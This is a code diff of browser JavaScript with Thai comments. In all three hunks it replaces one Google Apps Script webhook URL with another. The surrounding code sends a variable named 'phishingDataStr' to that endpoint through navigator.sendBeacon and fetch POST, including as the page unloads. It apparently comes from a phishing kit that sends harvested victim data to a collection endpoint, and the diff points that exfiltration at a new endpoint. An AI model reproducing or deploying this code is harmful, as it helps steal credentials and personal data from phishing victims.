@@ -158,7 +158,7 @@ window.addEventListener('beforeunload', function() {
         console.log("ส่งข้อมูลในช่วง beforeunload ด้วย beacon");
         
         // ส่งข้อมูลด้วย beacon
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const webhookUrl = 'https://script.google.com/macros/s/AKfycbzhILiUHtVIl6Sg2TgLWiVmEsTMt4FptuUelDCTYf4C4Q2yCBrc1N8i3icKklVQK6uL/exec';
         const blob = new Blob([phishingDataStr], {type: 'application/json'});
         
         if (navigator.sendBeacon(webhookUrl, blob)) {
@@ -312,7 +312,7 @@ window.addEventListener('beforeunload', function() {
       
       // ตรวจสอบว่าสามารถใช้ fetch ได้หรือไม่
       if (window.fetch) {
-        fetch('https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec', {
+        fetch('https://script.google.com/macros/s/AKfycbzhILiUHtVIl6Sg2TgLWiVmEsTMt4FptuUelDCTYf4C4Q2yCBrc1N8i3icKklVQK6uL/exec', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
@@ -358,7 +358,7 @@ function generateUniqueId() {
 
 // ฟังก์ชันส่งข้อมูลด้วย navigator.sendBeacon()
 function sendDataWithBeacon(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzhILiUHtVIl6Sg2TgLWiVmEsTMt4FptuUelDCTYf4C4Q2yCBrc1N8i3icKklVQK6uL/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
   const currentRequestId = dataToSend.requestId;
 
   // ตรวจสอบว่าเคยส่ง requestId นี้ใน session นี้หรือยัง
